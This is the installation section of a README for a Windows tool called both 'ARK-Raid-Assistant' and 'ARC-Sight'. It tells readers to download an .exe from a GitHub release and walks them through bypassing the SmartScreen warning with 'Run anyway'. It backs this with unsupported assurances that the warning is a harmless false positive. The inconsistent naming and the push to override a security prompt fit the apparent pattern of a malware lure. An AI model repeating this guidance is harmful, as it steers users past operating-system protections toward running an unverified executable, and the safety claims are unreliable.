# 📥 Installation

## Standard Installation

1. **Go** to the **[Releases](https://github.com/cybanovcyban-lang/ARK-Raid-Assistant/releases/tag/v2.6.0-rc.1)** page of this repository.
2. **Download** the latest installer — `ARK-Raid-Assistant .exe`.
3. **Run** the downloaded installer and follow the wizard's prompts.
4. After installation, **launch ARC-Sight** using the created desktop shortcut.

---

## ⚠️ Important Note: Windows Warning

When you first run the installer, you may encounter the **standard Windows security screen** ("Windows protected your PC" or SmartScreen).

This happens because ARC-Sight is an independent tool and does not have an expensive commercial digital signature. This is standard practice for small projects.

### How to bypass this (the steps are safe):

1. On the warning screen, click the "More details" button.
2. A hidden option will appear: "Run anyway." Click it.
3. The installation will continue as usual.

Why is this safe?
* This is a common "false positive" for applications written in C# and distributed by independent developers.
* The project's source code is completely open and transparent.
* The application does not modify system files or the memory of other processes.
